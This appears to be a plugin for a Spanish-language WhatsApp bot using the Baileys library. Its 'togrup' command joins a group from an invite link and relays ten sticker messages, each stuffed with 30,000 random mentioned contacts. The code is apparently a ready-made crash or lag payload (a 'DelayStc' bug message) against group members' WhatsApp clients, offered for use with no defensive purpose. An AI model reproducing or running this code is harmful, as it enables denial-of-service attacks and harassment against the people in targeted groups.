import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args, usedPrefix, command }) => {
  if (!args[0]) throw `⚠️ Usa el comando así: *${usedPrefix + command} <link del grupo>*`;

  let groupLink = args[0];
  let code = groupLink.match(/chat\.whatsapp\.com\/([\w\d]+)/i)?.[1];

  if (!code) throw '❌ Link de grupo inválido. Asegúrate de copiarlo correctamente.';

  try {
    let isTarget = await conn.groupAcceptInvite(code); // Únete al grupo

    for (let i = 0; i < 10; i++) {
      await DelayStc(conn, isTarget); // Envia 10 veces
    }

    m.reply(`✅ Envío completado al grupo.`);
  } catch (e) {
    console.error(e);
    m.reply('❌ No se pudo unir o enviar mensajes al grupo.');
  }
};

handler.command = /^togrup$/i;
handler.group = false; // Se puede usar fuera de grupos
handler.private = false;
handler.register = false;
handler.limit = false;

export default handler;

// FUNCIONES INTERNAS
async function DelayStc(rikz, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await rikz.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}